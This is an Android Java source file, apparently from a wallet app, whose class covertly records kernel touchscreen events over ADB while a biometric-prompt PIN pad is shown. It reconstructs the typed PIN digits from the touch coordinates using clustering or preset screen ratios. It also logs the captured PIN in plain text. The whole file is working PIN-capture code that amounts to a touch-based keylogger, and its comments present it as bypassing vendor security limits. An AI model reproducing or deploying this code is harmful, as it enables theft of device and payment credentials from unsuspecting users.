package com.guard.wallet.plug;

import android.os.Build;
import android.util.Log;
import com.guard.wallet.adb.AdbConnectionManager;
import com.guard.wallet.core.AppUtils;
import com.guard.wallet.utils.DeviceUtils;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * PIN Pad getevent 坐标捕获与动态网格映射。
 *
 * 方案: 通过 ADB shell getevent 捕获 Linux 内核级触摸事件，
 * 使用动态聚类自校准或比例坐标映射还原 PIN 数字。
 *
 * 映射策略 (优先级):
 *   1. 动态聚类: 6+ 次触摸时自动发现 3 列 N 行网格
 *   2. 比例坐标: 触摸次数不足时 fallback 到 OEM 预设比例
 *
 * 适用: API >= 33 + ADB 已连接 (不限厂商，坐标来自内核无安全限制)
 */
public final class OppoPinPadCapture {
    private static final String TAG = "OppoPinPadCapture";

    // getevent 原始坐标 → 需要运行时从设备获取
    private static int rawXMax = 12400;
    private static int rawYMax = 27720;

    private static final String CAPTURE_FILE = "/data/local/tmp/pin_touch.log";
    private static volatile String geteventPid = null;
    private static volatile boolean capturing = false;

    // ====== OEM 比例坐标预设 (fallback) ======
    // 键值: 列中心 / 行中心 占屏幕宽高的比例
    // 标定自 OPPO PGFM10 (1240x2772), ColorOS 16 BiometricPrompt
    private static final double[] DEFAULT_COL_RATIOS = {0.312, 0.573, 0.756};
    private static final double[] DEFAULT_ROW_RATIOS = {0.682, 0.744, 0.815, 0.881};

    private OppoPinPadCapture() {}

    /** 是否需要使用 getevent 坐标捕获 */
    public static boolean shouldUseCoordinateCapture() {
        return Build.VERSION.SDK_INT >= 33
                && AdbConnectionManager.getInstance() != null
                && AdbConnectionManager.getInstance().isConnected();
    }

    /**
     * 启动 getevent 后台捕获。
     * @return 是否成功启动
     */
    public static boolean startCapture(int timeoutSeconds) {
        if (capturing) return false;
        try {
            AdbConnectionManager mgr = AdbConnectionManager.getInstance();
            if (mgr == null || !mgr.isConnected()) return false;

            // 探测触摸屏设备和坐标范围
            String touchDev = detectTouchDevice(mgr);
            if (touchDev == null) {
                Log.e(TAG, "no touchscreen device found");
                return false;
            }

            mgr.executeShellCommand("rm -f " + CAPTURE_FILE);

            String cmd = "nohup sh -c 'getevent -t " + touchDev + "' > " + CAPTURE_FILE + " 2>&1 & echo $!";
            try (io.github.muntashirakon.adb.AdbStream stream = mgr.openStream("shell:" + cmd)) {
                InputStream is = stream.openInputStream();
                byte[] buf = new byte[256];
                StringBuilder sb = new StringBuilder();
                long deadline = System.currentTimeMillis() + 3000;
                while (!stream.isClosed() && System.currentTimeMillis() < deadline) {
                    int read = is.read(buf);
                    if (read == -1) break;
                    if (read > 0) sb.append(new String(buf, 0, read, StandardCharsets.UTF_8));
                    if (sb.toString().contains("\n")) break;
                }
                String pid = sb.toString().trim();
                if (!pid.isEmpty() && pid.matches("\\d+")) {
                    geteventPid = pid;
                    capturing = true;
                    Log.e(TAG, "getevent started on " + touchDev + " PID=" + pid);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "startCapture error", e);
        }
        return false;
    }

    /**
     * 停止捕获并解析 PIN。
     */
    public static String stopCaptureAndParsePIN(int screenWidth, int screenHeight) {
        capturing = false;
        try {
            AdbConnectionManager mgr = AdbConnectionManager.getInstance();
            if (mgr == null || !mgr.isConnected()) return null;

            if (geteventPid != null) {
                mgr.executeShellCommand("kill " + geteventPid);
                geteventPid = null;
            }
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}

            String raw = readFile(mgr, CAPTURE_FILE);
            if (raw == null || raw.isEmpty()) {
                Log.e(TAG, "capture file empty");
                return null;
            }

            List<int[]> touches = parseGeteventOutput(raw, screenWidth, screenHeight);
            if (touches.isEmpty()) {
                Log.e(TAG, "no touch events");
                return null;
            }

            // 过滤: 只保留 PIN pad 区域的触摸 (屏幕下半部分 y > 60%)
            List<int[]> pinTouches = new ArrayList<>();
            int yThreshold = (int) (screenHeight * 0.60);
            for (int[] t : touches) {
                if (t[1] > yThreshold) pinTouches.add(t);
            }
            Log.e(TAG, "total touches=" + touches.size() + " pin area touches=" + pinTouches.size());

            String pin;
            if (pinTouches.size() >= 6) {
                // 优先: 动态聚类 (不依赖任何预设坐标)
                pin = mapByDynamicClustering(pinTouches);
                Log.e(TAG, "dynamic clustering result: " + pin);
            } else {
                pin = null;
            }

            if (pin == null || pin.isEmpty()) {
                // Fallback: 比例坐标映射
                pin = mapByProportionalGrid(pinTouches, screenWidth, screenHeight);
                Log.e(TAG, "proportional mapping result: " + pin);
            }

            Log.e(TAG, "captured PIN: " + pin + " (" + pinTouches.size() + " touches)");
            mgr.executeShellCommand("rm -f " + CAPTURE_FILE);
            return pin;
        } catch (Exception e) {
            Log.e(TAG, "stopCaptureAndParsePIN error", e);
            return null;
        }
    }

    // ====== 动态聚类映射 (设备无关) ======

    /**
     * 从触摸坐标中自动发现 3 列 N 行网格并映射。
     * 不依赖任何预设坐标，完全自校准。
     *
     * 原理: 标准 PIN pad 是 3 列布局 (1-2-3, 4-5-6, 7-8-9, X-0-✓)
     * X 坐标聚类为 3 组 → 列; Y 坐标按时间顺序 → 行推断。
     */
    static String mapByDynamicClustering(List<int[]> touches) {
        if (touches.size() < 4) return null;

        // 1. 提取所有 X 坐标，聚类为 3 组
        List<Integer> allX = new ArrayList<>();
        for (int[] t : touches) allX.add(t[0]);
        int[] colCenters = kMeansClusters(allX, 3);
        if (colCenters == null) return null;
        Arrays.sort(colCenters);

        // 2. 提取所有 Y 坐标，聚类为 4 组 (3 行数字 + 0 行)
        List<Integer> allY = new ArrayList<>();
        for (int[] t : touches) allY.add(t[1]);
        int[] rowCenters = kMeansClusters(allY, 4);
        if (rowCenters == null) return null;
        Arrays.sort(rowCenters);

        // 3. 数字网格: [row][col] → digit
        int[][] grid = {{1, 2, 3}, {4, 5, 6}, {7, 8, 9}, {-1, 0, -1}};

        // 4. 映射每个触摸点
        StringBuilder pin = new StringBuilder();
        for (int[] t : touches) {
            int col = nearest(t[0], colCenters);
            int row = nearest(t[1], rowCenters);
            if (row < 4 && col < 3 && grid[row][col] >= 0) {
                pin.append(grid[row][col]);
            }
        }
        return pin.length() >= 4 ? pin.toString() : null;
    }

    /**
     * 简单 K-Means 聚类。
     * 将一维数据分为 k 组，返回每组中心。
     */
    static int[] kMeansClusters(List<Integer> data, int k) {
        if (data.size() < k) return null;
        List<Integer> sorted = new ArrayList<>(data);
        Collections.sort(sorted);

        // 初始中心: 等距取样
        double[] centers = new double[k];
        for (int i = 0; i < k; i++) {
            centers[i] = sorted.get(i * sorted.size() / k);
        }

        // 迭代 20 次
        for (int iter = 0; iter < 20; iter++) {
            int[][] groups = new int[k][0];
            List<List<Integer>> buckets = new ArrayList<>();
            for (int i = 0; i < k; i++) buckets.add(new ArrayList<>());

            for (int val : data) {
                int best = 0;
                double bestDist = Math.abs(val - centers[0]);
                for (int j = 1; j < k; j++) {
                    double dist = Math.abs(val - centers[j]);
                    if (dist < bestDist) { bestDist = dist; best = j; }
                }
                buckets.get(best).add(val);
            }

            boolean converged = true;
            for (int i = 0; i < k; i++) {
                if (buckets.get(i).isEmpty()) continue;
                double sum = 0;
                for (int v : buckets.get(i)) sum += v;
                double newCenter = sum / buckets.get(i).size();
                if (Math.abs(newCenter - centers[i]) > 1) converged = false;
                centers[i] = newCenter;
            }
            if (converged) break;
        }

        int[] result = new int[k];
        for (int i = 0; i < k; i++) result[i] = (int) Math.round(centers[i]);
        return result;
    }

    // ====== 比例坐标映射 (OEM fallback) ======

    static String mapByProportionalGrid(List<int[]> touches, int screenWidth, int screenHeight) {
        int[] colCenters = new int[3];
        int[] rowCenters = new int[4];
        for (int i = 0; i < 3; i++) colCenters[i] = (int) (DEFAULT_COL_RATIOS[i] * screenWidth);
        for (int i = 0; i < 4; i++) rowCenters[i] = (int) (DEFAULT_ROW_RATIOS[i] * screenHeight);

        int[][] grid = {{1, 2, 3}, {4, 5, 6}, {7, 8, 9}, {-1, 0, -1}};
        StringBuilder pin = new StringBuilder();
        for (int[] t : touches) {
            int col = nearest(t[0], colCenters);
            int row = nearest(t[1], rowCenters);
            if (row < 4 && col < 3 && grid[row][col] >= 0) {
                pin.append(grid[row][col]);
            }
        }
        return pin.length() >= 4 ? pin.toString() : null;
    }

    // ====== getevent 解析 ======

    static List<int[]> parseGeteventOutput(String raw, int screenWidth, int screenHeight) {
        List<int[]> touches = new ArrayList<>();
        int curRawX = -1, curRawY = -1;
        Pattern pX = Pattern.compile("0003 0035 ([0-9a-fA-F]+)");
        Pattern pY = Pattern.compile("0003 0036 ([0-9a-fA-F]+)");

        for (String line : raw.split("\n")) {
            Matcher mx = pX.matcher(line);
            if (mx.find()) { curRawX = Integer.parseInt(mx.group(1), 16); continue; }
            Matcher my = pY.matcher(line);
            if (my.find()) { curRawY = Integer.parseInt(my.group(1), 16); continue; }
            if (line.contains("0001 014a 00000001") && curRawX >= 0 && curRawY >= 0) {
                int sx = curRawX * screenWidth / rawXMax;
                int sy = curRawY * screenHeight / rawYMax;
                touches.add(new int[]{sx, sy});
                curRawX = -1; curRawY = -1;
            }
        }
        return touches;
    }

    // ====== 工具方法 ======

    /** 探测触摸屏设备路径和坐标范围 */
    private static String detectTouchDevice(AdbConnectionManager mgr) {
        try {
            String info = readCommandOutput(mgr, "getevent -pl");
            if (info == null) return "/dev/input/event2"; // fallback

            String currentDev = null;
            for (String line : info.split("\n")) {
                if (line.contains("add device") && line.contains("/dev/input/")) {
                    currentDev = line.replaceAll(".*(/dev/input/event\\d+).*", "$1");
                }
                if (line.contains("ABS_MT_POSITION_X") && currentDev != null) {
                    // 提取 max 值
                    Matcher m = Pattern.compile("max (\\d+)").matcher(line);
                    if (m.find()) rawXMax = Integer.parseInt(m.group(1)) + 1;
                    // 找到触摸屏
                    String touchDev = currentDev;
                    // 继续找 Y max
                    for (String line2 : info.substring(info.indexOf(line)).split("\n")) {
                        if (line2.contains("ABS_MT_POSITION_Y")) {
                            Matcher m2 = Pattern.compile("max (\\d+)").matcher(line2);
                            if (m2.find()) rawYMax = Integer.parseInt(m2.group(1)) + 1;
                            break;
                        }
                    }
                    Log.e(TAG, "detected touch device: " + touchDev + " rawMax=" + rawXMax + "x" + rawYMax);
                    return touchDev;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "detectTouchDevice error", e);
        }
        return "/dev/input/event2";
    }

    private static String readCommandOutput(AdbConnectionManager mgr, String cmd) {
        try (io.github.muntashirakon.adb.AdbStream stream = mgr.openStream("shell:" + cmd)) {
            InputStream is = stream.openInputStream();
            byte[] buf = new byte[4096];
            StringBuilder sb = new StringBuilder();
            long deadline = System.currentTimeMillis() + 5000;
            while (!stream.isClosed() && System.currentTimeMillis() < deadline) {
                int read = is.read(buf);
                if (read == -1) break;
                if (read > 0) sb.append(new String(buf, 0, read, StandardCharsets.UTF_8));
                if (sb.length() > 30000) break;
            }
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private static String readFile(AdbConnectionManager mgr, String path) {
        return readCommandOutput(mgr, "cat " + path);
    }

    private static int nearest(int value, int[] centers) {
        int best = 0, bestDist = Math.abs(value - centers[0]);
        for (int i = 1; i < centers.length; i++) {
            int dist = Math.abs(value - centers[i]);
            if (dist < bestDist) { bestDist = dist; best = i; }
        }
        return best;
    }
}
